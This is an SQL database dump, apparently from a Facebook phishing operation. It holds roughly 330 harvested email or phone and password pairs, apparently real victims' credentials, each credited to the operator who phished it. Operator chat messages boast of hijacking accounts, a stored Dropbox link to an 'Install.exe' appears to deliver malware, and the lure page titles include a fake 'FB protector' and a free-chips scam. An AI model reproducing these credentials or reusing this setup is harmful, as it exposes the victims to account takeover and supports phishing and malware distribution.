-- phpMyAdmin SQL Dump
-- version 3.5.8.2
-- http://www.phpmyadmin.net
--
-- Host: sql305.byetcluster.com
-- Generation Time: Nov 09, 2018 at 06:57 PM
-- Server version: 5.6.41-84.1
-- PHP Version: 5.3.3

SET SQL_MODE="NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;

--
-- Database: `mzzho_15776618_lolkhaner`
--

-- --------------------------------------------------------

--
-- Table structure for table `accounts`
--

CREATE TABLE IF NOT EXISTS `accounts` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `email` longtext NOT NULL,
  `pass` longtext NOT NULL,
  `byyy` longtext NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=335 ;

--
-- Dumping data for table `accounts`
--

INSERT INTO `accounts` (`id`, `email`, `pass`, `byyy`) VALUES
(4, 'munkhan44@gmail.com', 'thisisatest', 'ammadkhan'),
(5, 'ammad.k.dawar', 'khan4u', 'ammadkhan'),
(6, 'usama_citizen@hotmail.com', 'knornoodle1', 'ammadkhan'),
(7, 'k_araiz@yahoo.com', 'cenation14551215araiz', 'ammadkhan'),
(8, 'munkhan33@gmail.com', 'test', 'khankhan'),
(9, 'hdhsjsus@.com', 'fahad', 'khankhan'),
(10, 'sinceregirl24@yahoo.com', 'oldlady', 'khankhan'),
(11, 'luqeekhanzada456@gmail.com', 'test', 'nasirkhan'),
(12, 'dashingmunda541@hotmail.com', 'fuckufuckufuckufucku', 'irfankhan'),
(13, 'khanammad@gmail.cim', 'gwgshshshdhd', 'irfankhan'),
(14, 'salkhangandapur@gmail.com', 'xperia', 'khankhan'),
(15, 'hasSymahsud007@gmail.com', 'marwakhan4', 'ammadkhan'),
(16, 'fahad', 'fahad', 'ammadkhan'),
(17, 'fahad', 'fahad', 'khankhan'),
(18, 'irfanpiuyt@dfzggbzx', 'rdyhusthrf', 'irfankhan'),
(19, 'hasSymahsud007@gmail.com', 'marwakhan4', 'khankhan'),
(20, 'ammad.k.dawar', 'hsgsgshusshhs', 'ammadkhan'),
(21, 'qamar marwat', 'ayesha', 'irfankhan'),
(22, 'sameekhanpti', 'naseeeb', 'ammadkhan'),
(23, 'donomar@hotmail.com', 'fuckunasir', 'sikander'),
(24, 'khan', 'gdvdgsgshsg', 'ammadkhan'),
(25, 'ammad', 'bfhdhdh', 'ammadkhan'),
(26, 'zalimmii@yahoo.com', 'lovenv@143', 'khankhan'),
(27, 'chicko.ishangi@yahoo.com', 'fuckurasswhole', 'khankhan'),
(28, 'javedmahsud77@gmail.com', '03459845889', 'irfankhan'),
(29, 'nasirkhan4551@yahoo.com', 'ammada kwana te', 'ammadkhan'),
(30, 'decorchexii', 'hacker', 'khankhan'),
(31, 'karachi2535327', 'karachi2535327', 'irfankhan'),
(32, 'abdulaziz.nayyar@gmail.com', '28194892852', 'sikander'),
(33, 'misbah_128@yahoo.com', 'yasinagull', 'irfankhan'),
(34, 'hamayunkhan2005@yahoo.com', 'khan111', 'sikander'),
(35, 'jan_sher1@hotmail.com', 'nelo1234', 'irfankhan'),
(36, 'aqib.shuaib@yahoo.com 03005595759', 'pakistan', 'nasirkhan'),
(37, 'amaaqib@yahoo.com', 'pakistan12', 'nasirkhan'),
(38, '03459253022', 'pak123', 'nasirkhan'),
(39, '03068564716', '321321khan', 'irfankhan'),
(40, '03068564716', '321321khan', 'irfankhan'),
(41, 'khant3223@gmail.com', '223344gg', 'nasirkhan'),
(42, 'sulmanishtiaq489@yahoo.com', '03046731486', 'nasirkhan'),
(43, 'sulmanishtiaq489@yahoo.com', '03046731486', 'nasirkhan'),
(44, 'usmanghani99@0utlook.com', 'germany12', 'khankhan'),
(45, 's.asghar71@yahoo.com', 'ASghar123', 'nasirkhan'),
(46, 's.asghar71@yahoo.com', 'ASghar123', 'nasirkhan'),
(47, 's.asghar@71 yahoo..com', 'ASghar123', 'nasirkhan'),
(48, 'k.farhan1221@gmail.com', 'farhankhan', 'nasirkhan'),
(49, '03218511031', '003397', 'nasirkhan'),
(50, 'atifabeera@gmail.com', 'rana35228', 'irfankhan'),
(51, 'sherrykhan8@yahoo.com', 'sherrykhan563', 'khankhan'),
(52, 'khaninam496@gmail.com', 'inamkhan', 'nasirkhan'),
(53, 'Gufrankhan657@gmail.com', 'khangufran12', 'khankhan'),
(54, '8793352973', '786786', 'khankhan'),
(55, '8793352973', '786786', 'khankhan'),
(56, 'siddhesh16 wanjari@gmail.com', 'sidhu8055954623', 'khankhan'),
(57, 'xohakhan81@ymail.com', 'blackbird7191', 'irfankhan'),
(58, 'zeeshankhan201988@gmail.com', 'merijanshad12#', 'khankhan'),
(59, 'zeeshankhan201988@gmail.com', 'merijanshad12#', 'khankhan'),
(60, 'Ibadahmadkhan@live.com', 'ahmadusman045', 'khankhan'),
(61, 'fahad', 'hi', 'khankhan'),
(62, 'khansahb24@yahoo.com', 'chemistry123', 'khankhan'),
(63, 'khansahb24@yahoo.com', 'chemistry1123', 'khankhan'),
(64, 'breshna.shah@yahoo.com', 'shift22', 'irfankhan'),
(65, 'maryam_14192@hotmail.com', '4175415', 'sikander'),
(66, 'Maheensharif5@gmail.com', 'mangotree', 'sikander'),
(67, 'maheensharif5@gmail.com', 'mangotree', 'sikander'),
(68, 'farheenakhan900@yahoo.com', 'breakeven1', 'sikander'),
(69, 'naughtyangel722@gmail.com', 'democracY227', 'sikander'),
(70, 'none', 'alizayshanzay', 'sikander'),
(71, 'ai.farooq@yahoo.com', 'cheema035', 'sikander'),
(72, 'alituri123@yahooo.com', 'mw3khan13524', 'ammadkhan'),
(73, 'hnoman77@yahoo.com', 'userrer', 'ammadkhan'),
(74, 'xohakhan81@ymail.com', 'lovebitches110', 'sikander'),
(75, '03038515909', 'sumaira khan', 'khankhan'),
(76, '03038515909', 'sumaira khan', 'khankhan'),
(77, 'bkg680@yahoo.co.za', 'Barkat00000', 'irfankhan'),
(78, 'f_farhadkhan@yahoo.com', '03339987633', 'irfankhan'),
(79, 'arsalkan@yahoo.com', 'pakarmy112233', 'irfankhan'),
(80, 'munakhan7777@gmail.com', 'jabirbinhayan', 'irfankhan'),
(81, 'munakhan7777@gmail.com', 'jabirbinhayan', 'irfankhan'),
(82, 'munakhan7777@gmail.com', 'jabirbinhayan', 'irfankhan'),
(83, 'munakhan7777@gmail.com', 'jabirbinhayan', 'irfankhan'),
(84, 'irfi77light@yahoo.com', 'fani77', 'irfankhan'),
(85, 'hdhdj', 'hxjdj', 'khankhan'),
(86, 'noman_4814@yahoo.com', 'hesoyam12', 'khankhan'),
(87, 'zeshankhan278@gmail.com', 'Qmobilea22', 'irfankhan'),
(88, 'shams.wazir001@gmail.com', 'sawazir', 'pirfahad'),
(89, 'amaseed1@yahoo.com', 'saleh8420', 'khankhan'),
(90, 'Khubaab walee', 'lovepolice', 'irfankhan'),
(91, 'Khubaab walee', 'lovepolice', 'irfankhan'),
(92, 'manshahussainbangash@gmail.com', 'pakistan22', 'muneebkhan'),
(93, 'addu5907@yahoo.com', 'onlyaddu', 'irfankhan'),
(94, 'pak03159363638', 'pak03159363638', 'irfankhan'),
(95, 'ataburki.555@gmail.com', 'pak03159363638', 'irfankhan'),
(96, 'wantedkahn@gmail.com', 'wantedkhan', 'irfankhan'),
(97, '00971558395496', 'wantwdkhan', 'irfankhan'),
(98, 'Afaq.baloch.14@facebook.com', 'lasharigate', 'irfankhan'),
(99, 'hanzla33245@gmail.com', 'hanzla', 'irfankhan'),
(100, 'hanzla33245@gmail.com', 'hanzla', 'irfankhan'),
(101, 'afaq.baloch.14@facebook.com', 'pakistan225', 'irfankhan'),
(102, 'santabanta696969@gmail.com', 'herwin@143', 'irfankhan'),
(103, 'azanalizai@gmail.com', 'khanalizai', 'khankhan'),
(104, '03452613836', 'joker', 'nasirkhan'),
(105, 'khalilmaxwel@Gmil.com', '786777', 'irfankhan'),
(106, 'khalilmaxwel@Gmail.com', '786777', 'irfankhan'),
(107, 'lolknha@lol.com', 'lol', 'muneebkhan'),
(108, 'khalilwaxwel@Gmail.com', '786777', 'irfankhan'),
(109, '03347216765', 'Goodluck', 'irfankhan'),
(110, 'mehrmah.khan24@yahoo.com', 'khansarukhsar2015', 'irfankhan'),
(111, 'syeda_gillani@hotmail.com', 'memano987', 'irfankhan'),
(112, 'student40quest@gmail.com', 'junaid123456789', 'irfankhan'),
(113, 'ansikhan', 'hudaina', 'irfankhan'),
(114, 'gred rood', 'delyduly', 'irfankhan'),
(115, 'pappukha.pk.334@gmail.com', '353535', 'irfankhan'),
(116, 'pappukham.pk.334@gmail.com', '353535', 'irfankhan'),
(117, 'pappukham.pk.334@gmail.com', '353535', 'irfankhan'),
(118, 'soban_akram@yahoo.com', 'sobanjimm', 'irfankhan'),
(119, 'sjsjs', 'khan', 'irfankhan'),
(120, '03450919193', '9012418', 'irfankhan'),
(121, '03450919193', '9012418', 'irfankhan'),
(122, 'hurtingdimple@gmail.com', 'bilalkhan.4576', 'irfankhan'),
(123, 'studentmaturity@yahoo.com', 'back2back', 'irfankhan'),
(124, 'shaukatullah.1122@yahoo.com', 'sain786m', 'irfankhan'),
(125, 'nadiakhan7723@gmail.com', 'aman00', 'irfankhan'),
(126, 'nadiakhan7723@gmail.com', 'aman00', 'irfankhan'),
(127, 'haiderburki@yahoo.com', 'olxpakistan', 'muneebkhan'),
(128, 'pappukham.pk.334@gmail.com', '455445', 'irfankhan'),
(129, 'shezada.shani', '353535', 'irfankhan'),
(130, 'imran.dera@gmail.com', '03455632232', 'irfankhan'),
(131, 'mehboobarain@gmail.com', 'bulbul017', 'irfankhan'),
(132, 'liaqat town zaffar abad colony.d.i.khan', 'numinumi', 'irfankhan'),
(133, 'sad_prince777@yahoo.com', 'numinumi', 'irfankhan'),
(134, 'sad_prince777@yahoo.com', 'numinumi', 'irfankhan'),
(135, 'Masid1@yahoo.com', 'umerkhayam11', 'irfankhan'),
(136, 'owais54@gamil.com', 'ot1234', 'irfankhan'),
(137, 'owais54@gamil.com', 'ot1234', 'irfankhan'),
(138, 'rostu_haider@hotmail.com', 'sonofbitch', 'sikander'),
(139, 'afnan.khan.902819', '5565588', 'pirfahad'),
(140, 'yasirkhan619@gmail.com', '987654321', 'irfankhan'),
(141, 'yasirkhan610@gmail.com', 'yasirkhan420', 'irfankhan'),
(142, 'shams.wazir001@gmail.com', 'sawazir', 'ammadkhan'),
(143, 'yahahahh', 'hzhshzhsu', 'khankhan'),
(144, 'irafn69@yahoo.com', '12345', 'irfankhan'),
(145, 'ERRORBYME@GMAIL.COM', '3453144705a', 'irfankhan'),
(146, 'nosherwankhan37@yahoo.com', 'Loveufifaa', 'muneebkhan'),
(147, 'nosherwankhan37@yahoo.com', 'Loveufifaa', 'muneebkhan'),
(148, 'ramissaeed@gmail.com', 'fucku', 'muneebkhan'),
(149, 'ramissaeed@gmail.com', 'Terimaakikuss', 'muneebkhan'),
(150, 'You are a mother fucker', 'Fuckfiza', 'muneebkhan'),
(151, 'Fiza ki gand mai dal ', 'Aurdosra daal apni gand mai', 'muneebkhan'),
(152, '03068564716', 'SAVECHAN', 'noshiloltun'),
(153, '03068564716', 'savechan', 'noshiloltun'),
(154, '03068564716', 'savechan', 'noshiloltun'),
(155, 'Abbascityschool@yahoo.com', 'tiger420!', 'noshiloltun'),
(156, 'Abbascityschool@yahoo.com', 'tiger420!', 'noshiloltun'),
(157, '03218511031', '003397', 'nasirkhan'),
(158, 'irfankhan@yahoo.com', 'khan123', 'irfankhan'),
(159, 'irfanpurwana96@yahoo.com', 'fucku', 'irfankhan'),
(160, 'adnan.khan928@yahoo.com', 'jhonadnan654321', 'irfankhan'),
(161, 'lun@tattey.com', 'fucju', 'noshiloltun'),
(162, 'yousafkhan266@yahoo.com', 'lun dhekha hahaha bacha samja huwa hy', 'irfankhan'),
(163, 'yousafkhan266@yahoo.com', 'lun', 'irfankhan'),
(164, 'sikNdermuankhel2009@hotmail.com', 'kuta', 'sikander'),
(165, 'Haya_iman54@yahoo.com', 'Dontmess1234', 'sikander'),
(166, 'kingisman429@yahoo.com', '064543', 'irfankhan'),
(167, 'kingusman429@yahoo.com', '064543', 'irfankhan'),
(168, 'fhgajxu', 'hsgsj', 'irfankhan'),
(169, 'noorgul440@gamial.com', 'nooraiza', 'irfankhan'),
(170, '03068564716', 'paripari', 'irfankhan'),
(171, 'rostu_haider@hotmail.com', 'dilamochi', 'sikander'),
(172, 'shahfaisal_89@yahoo.com', 'liyaqattown001', 'irfankhan'),
(173, 'khan4320@yahoo.com', 'kashir4320', 'irfankhan'),
(174, '03366966522', 'gullubut', 'irfankhan'),
(175, 'Javeriazaidi624@yahoo.com', 'Your password (as on facebook)', 'irfankhan'),
(176, 'good@yahoo.com', 'good', 'irfankhan'),
(177, 'rostu_haider@hotmail.com', 'jinnahhouse', 'sikander'),
(178, 'rostu_haider@hotmail.com', 'ulukipathi', 'sikander'),
(179, 'fatima0khan1@gmail.com', 'ilovemyself', 'irfankhan'),
(180, 'fatima0khan1@gmail.com', 'ilovemyself', 'irfankhan'),
(181, 'nicegirl3307@gmail.com', 'meedoojaan', 'irfankhan'),
(182, 'nicegirl3307@gmail.com', 'meedoojaan', 'irfankhan'),
(183, 'Innocentking546@yahoo.com', 'Wm34448', 'irfankhan'),
(184, 'shanhaider36@gmail.com', 'mathsa', 'ammadkhan'),
(185, 'hinaa9054@gmail.com', 'shahbaz11', 'irfankhan'),
(186, 'rehmatali_888@yahoo.com', 'almasitu123', 'ammadkhan'),
(187, 'rehmatali_888@yahoo.com', 'almasitu123', 'ammadkhan'),
(188, 'munkhan44@gmail.com', 'lol', 'muneebkhan'),
(189, 'Hania baloch ', 'sahilraja', 'irfankhan'),
(190, 'SanaSiddiqui27@gamil.com', 'kajal.khan', 'irfankhan'),
(191, 'sana Siddiqui', 'sahilreaja', 'irfankhan'),
(192, '03465906308', 'munu3333', 'sikander'),
(193, 'hasfa411411@gmail.com', 'description', 'irfankhan'),
(194, 'shazia.khan704@yahoo.com', '59171412', 'irfankhan'),
(195, 'Shazia.Khan704@Yahoo.Com', '591711412', 'irfankhan'),
(196, 'amarar4114211@gmail.com', 'descctiption', 'irfankhan'),
(197, 'hassankhan011@yahoo.com', 'toyotaxli', 'irfankhan'),
(198, 'hassankhan011@yahoo.com', 'toyotaxli', 'irfankhan'),
(199, 'hassankhan011@yahoo.com', 'toyotaxli', 'irfankhan'),
(200, '03038996706', 'I sweet u', 'irfankhan'),
(201, '03038996706', 'I sweet u', 'irfankhan'),
(202, '03038996706', 'I sweet u', 'irfankhan'),
(203, 'samikhan78966@yahoo.com', 'Khan786', 'irfankhan'),
(204, 'samikhan78966@yahoo.com', 'Khan786', 'irfankhan'),
(205, '03070491909', 'danisyedabreakup', 'irfankhan'),
(206, 'naheed.mughal.5070', 'alimugheri1', 'irfankhan'),
(207, 'faizmugheri880@yahoo.com', 'alimugheri1', 'irfankhan'),
(208, 'naheed.mughal.5070', 'alimugheri1', 'irfankhan'),
(209, 'mirzasiddiqui6@gamil.com', 'kajal.khan', 'irfankhan'),
(210, 'khansaad858@gmail.com ', 'abidakhan', 'irfankhan'),
(211, 'yes', 'salmankhan', 'irfankhan'),
(212, '03152302090', '03152302090', 'irfankhan'),
(213, '03152302090', '03152302090', 'irfankhan'),
(214, 'sufiyankhan344@gmail.com', 'innocent', 'irfankhan'),
(215, 'safisadiqi786@gmail.com', 'madinahjan', 'irfankhan'),
(216, '03429004554', 'sana100', 'irfankhan'),
(217, 'nauman_1d@yahoo.com', 'redbox99', 'sikander'),
(218, '03333237714', 'l0verspz', 'irfankhan'),
(219, '03460047874', 'sweetsweet123', 'ammadkhan'),
(220, 'tayyabkah99@yahoo.com', 'mera lun chutu', 'irfankhan'),
(221, 'fhgg', 'gtr', 'irfankhan'),
(222, 'hmed880@yahoo.com', 'gfhfghfhtrytut', 'irfankhan'),
(223, 'khatikhan22', 'pakistan1234', 'irfankhan'),
(224, 'ma922470@gmail.com', 'dildarmaher', 'irfankhan'),
(225, 'arbazkapoor@hotmail.com', 'pass*ward', 'irfankhan'),
(226, 'arbazkapoor@hotmail.com', 'pass*ward', 'irfankhan'),
(227, '03038995706', 'I sweet u', 'irfankhan'),
(228, '03038996706', 'I sweet u', 'irfankhan'),
(229, 'samikhan78966@yahoo.com', 'Khan786', 'irfankhan'),
(230, 'shams.wazir001@gmail.com', 'lpwazir', 'pirfahad'),
(231, '03139362159', 'mamoonkhan', 'irfankhan'),
(232, '03005798388', 'loveMEasIm-143', 'irfankhan'),
(233, '03005798388', 'loveMEasIm', 'irfankhan'),
(234, 'lpc bc', 'lpc bc', 'nasirkhan'),
(235, 'qasirdik@yahoo.com', 'intel123', 'irfankhan'),
(236, 'mamoonrashid179@gmail.com', 'mamoonkhan', 'irfankhan'),
(237, 'qasirdik@yahoo.com', 'intel123', 'irfankhan'),
(238, 'qasirdik@yahoo.com', 'intel123', 'irfankhan'),
(239, 'qasirdik@yahoo.com', 'intel123', 'irfankhan'),
(240, 'mahsudnehal@yahoo.com', 'nehal1@234', 'khankhan'),
(241, 'hizb187@facebook.com', 'hizbullah187', 'khankhan'),
(242, 'great_pathan9361@yahoo.com', 'qadeer125@', 'khankhan'),
(243, 'hi930659@gmail.com', '840117', 'irfankhan'),
(244, '03145788079', 'jimmyy', 'irfankhan'),
(245, 'karwan1030@yahoo.com', 'shan123', 'irfankhan'),
(246, 'kingkhan', 'ghinga', 'sikander'),
(247, 'khan472@gmail.com', 'possword', 'sikander'),
(248, '03331633382', 'winterpp', 'irfankhan'),
(249, '03068564716', 'savetheworld', 'irfankhan'),
(250, 'captainasifkundi@yahoo.com', 'jhjhuvu', 'irfankhan'),
(251, 'shahzaikhan53sk4.@gmail.com', 'Goodluck1', 'irfankhan'),
(252, 'shahzaikhan53sk.4@gmail.com', 'Goodluck1', 'irfankhan'),
(253, 'shahzaikhan53sk.4@gmail.com', 'Good1990', 'irfankhan'),
(254, 'bhai.ali51@yahoo.com', 'godangel', 'irfankhan'),
(255, 'shahzaikhan53sk.4@gmail.com', 'Goodluck1', 'irfankhan'),
(256, 'shahzaikhan53sk.4@gmail.com', 'Goodluck1', 'irfankhan'),
(257, 'kashif.gandapur.7', '1234ghayasapple', 'irfankhan'),
(258, '03333237714', 'Z0bimarwat', 'irfankhan'),
(259, 'afnankhangandapur_99@yahoo.com', 'hitler', 'irfankhan'),
(260, 'hinaadnan789@gmail.com', 'adnan789', 'irfankhan'),
(261, '3467875449', '112345678900', 'irfankhan'),
(262, 'prince_asaad1@yahoo.com', 'queenkhan2015', 'irfankhan'),
(263, 'shafqatalikhan1992@gmail.com', 'shafqatali', 'irfankhan'),
(264, 'fuckyousana@motherchod.com', 'teri mah ko mera pass ekk din bhajna password bata dunga', 'irfankhan'),
(265, '9540810907', 'evergreen$', 'irfankhan'),
(266, 'khanigandapuri@facebook.com', 'gandapur', 'irfankhan'),
(267, 'asifking1234@gmail.com', '03406788762', 'irfankhan'),
(268, 'sabinakhan129@gmail.cim', 'sabin890', 'irfankhan'),
(269, 'changaizkhan47@yahoo.com', 'emaan3727722', 'irfankhan'),
(270, 'suhaima.areej@gmail.com', 'salmankhan', 'irfankhan'),
(271, '03132163564', 'whtrrs', 'irfankhan'),
(272, '03420203600', 'sameena', 'irfankhan'),
(273, '03420203600', 'sameena', 'irfankhan'),
(274, '03420203600', 'sameena', 'irfankhan'),
(275, 'kajsksmj', 'kajwj', 'irfankhan'),
(276, '923041556525', 'shakirkhan', 'irfankhan'),
(277, '123456abcdef', '245677fgghh', 'irfankhan'),
(278, 'sad_prince777@yahoo.com', 'numinumi', 'irfankhan'),
(279, 'mubashirumer1995@yahoo.com', 'delta436', 'sikander'),
(280, 'suhaima.areej@gmail.com', 'salmankhan', 'irfankhan'),
(281, 'suhema.areej@gmail.com', 'salmankhan', 'irfankhan'),
(282, 'suhaima.areej@gmail.com', 'salmankhan', 'nasirkhan'),
(283, 'khurrammshahzad97@gmail.com', 'khurramm', 'nasirkhan'),
(284, 'piyary143@yahoo.com', 'suhaimanoman', 'nasirkhan'),
(285, 'ullahasad108@yahoo.com', 'asad108', 'irfankhan'),
(286, 'alamaiqbal7@gmail.com', 'HA!!@@##$$%%', 'sikander'),
(287, 'rostu_haider@hotmail.com', 'jhinga', 'sikander'),
(288, 'fuckoff.pk', 'teri maa ki choot kuttiki bachi', 'sikander'),
(289, 'boy.adeelb@yahoo.com', '12345678', 'irfankhan'),
(290, 'zohaali965@gmail.com', 'sabahaslam', 'irfankhan'),
(291, 'zaib450@outlook.com', 'omer', 'irfankhan'),
(292, 'hemanth9284@gmail.com', 'www.hemanth9284', 'irfankhan'),
(293, 'khanakhahshdjdj', 'hrjrjekd', 'irfankhan'),
(294, 'musa628100@gmail.com', 'Musaraza1', 'ammadkhan'),
(295, 'nomanawan17@yahoo.com', 'reyanbaber78', 'nasirkhan'),
(296, 'nomanawan17@yahoo.com', 'reyanbaber78', 'nasirkhan'),
(297, 'nomanawan17@yahoo.com', 'reyanbaber78', 'nasirkhan'),
(298, 'kusama564@gmail.com', 'preetty', 'nasirkhan'),
(299, 'razamodern@gmail.com', '0555134866', 'nasirkhan'),
(300, 'razamodern@gmail.com', '0555134866', 'nasirkhan'),
(301, 'razamodern@gmail.com', '0555134866', 'nasirkhan'),
(302, 'razamodern@gmail.com', '0555134866', 'nasirkhan'),
(303, 'razamodern@gmail.com', '0555134866', 'nasirkhan'),
(304, 'razamodern@gmail.com', '0555134866', 'nasirkhan'),
(305, 'rihanmalik10@yahoo.com', 'malikanig', 'nasirkhan'),
(306, 'baba', 'baba', 'nasirkhan'),
(307, 'malikrihan10@yahoo.com', 'maheenuu4', 'nasirkhan'),
(308, 'Humaramzan286@yahoo.com', 'H5555555555', 'ammadkhan'),
(309, 'rumaisashah100@outlook.con', 'masoomncute', 'ammadkhan'),
(310, 'sultan_009 yahoo.com', 'djdpsnf', 'ammadkhan'),
(311, 'Soammohsin@gmail.com', 'djfn', 'irfankhan'),
(312, 'raza.musa@yahoo.com', 'Musayo', 'ammadkhan'),
(313, '03153004682', 'arslan0322', 'ammadkhan'),
(314, 'ayazbutt222@gmail.com', 'kareena', 'ammadkhan'),
(315, 'dawoodrana18@yahoo.com', 'ABCabc5307', 'ammadkhan'),
(316, 'ahahmalik447@yahoo.com', 'ahad123', 'ammadkhan'),
(317, 'mani123mani123@yahoo.com', 'mani123456789123', 'ammadkhan'),
(318, 'qamar.cheema5@yahoo.com', 'galaxy 567', 'ammadkhan'),
(319, 'qamar.cheema5@yahoo.com', 'galaxy567', 'ammadkhan'),
(320, '03111418208', 'Lovelyg', 'nasirkhan'),
(321, 'zainkhan3388@gmail.com', 'Asdfgh92##', 'nasirkhan'),
(322, '03346538145', 'qwerty4321', 'nasirkhan'),
(323, 'umarkhanbaloxh@gmail.com', 'umarfarooqsobia', 'nasirkhan'),
(324, 'khanmehran@ginal.com', 'pakistan', 'nasirkhan'),
(325, 'fcfdd@gmail.com', 'szd', 'ammadkhan'),
(326, '03028616130', 'biosucks12', 'ammadkhan'),
(327, '+923249613059', 'devilmaycry12', 'ammadkhan'),
(328, 'salman13_khan@yahoo.com', 'mzareenkhan11007', 'nasirkhan'),
(329, 'kiransharma2362@gmail.com', '9878072136', 'nasirkhan'),
(330, 'kiransharma2362@gmail.com', '9878072136', 'nasirkhan'),
(331, 'muneebkhanlol.com', 'khan', 'muneebkhan'),
(332, 'hai.ali51@yahoo.com', 'godangel111', 'nasirkhan'),
(333, 'kiransharma2362@gmail.com', '9878072136', 'nasirkhan'),
(334, 'fahadmahmood163@yahoo.com', 'pakistanfahad134', 'nasirkhan');

-- --------------------------------------------------------

--
-- Table structure for table `feed`
--

CREATE TABLE IF NOT EXISTS `feed` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `chawara` longtext NOT NULL,
  `chata` longtext NOT NULL,
  `feedd` longtext NOT NULL,
  `when` longtext NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=16 ;

--
-- Dumping data for table `feed`
--

INSERT INTO `feed` (`id`, `chawara`, `chata`, `feedd`, `when`) VALUES
(1, 'muneebkhan', 'nasirkhan', 'hello', ''),
(2, 'pirfahad', 'muneebkhan', 'taaak', ''),
(3, 'pirfahad', 'nasirkhan', 'taaak', ''),
(4, 'pirfahad', 'nasirkhan', 'taaak', ''),
(5, 'sikander', 'muneebkhan', 'chutu', ''),
(6, 'sikander', 'ammadkhan', 'harami hamari ids ghuma raha hai', ''),
(7, 'sikander', 'nasirkhan', 'tandori chohoca', ''),
(8, 'sikander', 'pirfahad', 'chutu 9 ids hijacked kar li hai tuna', ''),
(9, 'ammadkhan', 'sikander', 'kon', ''),
(10, 'ammadkhan', 'ammadkhan', 'maza ata hai', ''),
(11, 'muneebkhan', 'muneebkhan', '@fahad Taaaaaaaaaaaaaaakkkkkkkkkkk', ''),
(12, 'pirfahad', 'muneebkhan', 'qureshi', ''),
(13, 'irfankhan', 'khankhan', 'salm khan', ''),
(14, 'muneebkhan', 'irfankhan', 'Dere maze kawe lagya e, 57 ids de hijacked  kal.', ''),
(15, 'irfankhan', 'noshiloltun', ' bht harami hai tu kanjar insaan', '');

-- --------------------------------------------------------

--
-- Table structure for table `hmk`
--

CREATE TABLE IF NOT EXISTS `hmk` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `forr` varchar(70) NOT NULL,
  `link` varchar(500) NOT NULL,
  `killl` int(1) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=2 ;

--
-- Dumping data for table `hmk`
--

INSERT INTO `hmk` (`id`, `forr`, `link`, `killl`) VALUES
(1, 'khankhan', 'https://www.dropbox.com/s/siauc8e66nvuh0s/Install.exe?dl=1', 0);

-- --------------------------------------------------------

--
-- Table structure for table `store`
--

CREATE TABLE IF NOT EXISTS `store` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` longtext NOT NULL,
  `des` longtext NOT NULL,
  `usage` longtext NOT NULL,
  `uses` int(11) NOT NULL,
  `lastuser` int(11) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Table structure for table `users`
--

CREATE TABLE IF NOT EXISTS `users` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` longtext NOT NULL,
  `pass` longtext NOT NULL,
  `website` longtext NOT NULL,
  `profile` longtext NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=9 ;

--
-- Dumping data for table `users`
--

INSERT INTO `users` (`id`, `name`, `pass`, `website`, `profile`) VALUES
(2, 'ammadkhan', 'pakistan4me', 'http://bit.ly/1ur4DAf', 'http://i.imgur.com/zfZU617.jpg'),
(3, 'irfankhan', 'pakiatan', 'http://bit.ly/1zghrAE', 'http://i.imgur.com/Shh5rwht.jpg'),
(4, 'nasirkhan', 'khannasir', 'http://bit.ly/15Km8pK', 'http://i.imgur.com/evvtHTht.jpg'),
(5, 'muneebkhan', 'khan', 'http://bit.ly/1BPXRM4', 'http://i.imgur.com/0epoZSIt.png'),
(6, 'khankhan', 'taak', 'http://bit.ly/1FOGUCF', 'http://i.imgur.com/klYrrWGt.jpg'),
(7, 'sikander', 'donomar  ', 'http://bit.ly/1uY5Bd8', 'http://i.imgur.com/AZ3uQZs.jpg'),
(8, 'noshiloltun', '', 'http://bit.ly/1N5f9sG', 'http://i.imgur.com/RcogTln.jpg');

-- --------------------------------------------------------

--
-- Table structure for table `website`
--

CREATE TABLE IF NOT EXISTS `website` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `title` longtext NOT NULL,
  `description` longtext NOT NULL,
  `chawara` longtext NOT NULL,
  `footer` longtext NOT NULL,
  `logo` longtext NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=8 ;

--
-- Dumping data for table `website`
--

INSERT INTO `website` (`id`, `title`, `description`, `chawara`, `footer`, `logo`) VALUES
(1, 'Smart Book', 'You can find out many songs and movies our here.... ', 'ammadkhan', 'Created by instagram', 'Instagram '),
(6, 'FB protector', 'FB protector will protects your fb account from hacking join and like it', 'sikander', 'Created by Facebook', 'diamond'),
(2, 'Dikhan civil society ', 'A girl student of pharmacy deptt burn her self because of professor', 'nasirkhan', '', 'diamond'),
(3, 'Transfer 100M to your facebook account in only 5 minutes', 'BOWLING KKNG', 'irfankhan', 'It can transfer 100M to your facebook account in 5 minutes in 24 hours you can transfer 1B chips to your account', 'diamond'),
(4, 'Islamic', 'Online video chat network lets you connect and chat with random people around the world.', 'muneebkhan', 'Created by Muneeb Khan Sheikh - Ex-student at Harvard university', 'We chat'),
(5, 'Punjab group of collage dikhan', 'This will help you to connect to many people.', 'khankhan', 'Created by directors of punjab. ', 'facebook-official'),
(7, 'facebook messenger', 'A new way to be connect to your friends\r\n', 'noshiloltun', 'google   team', 'facebook-official');

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
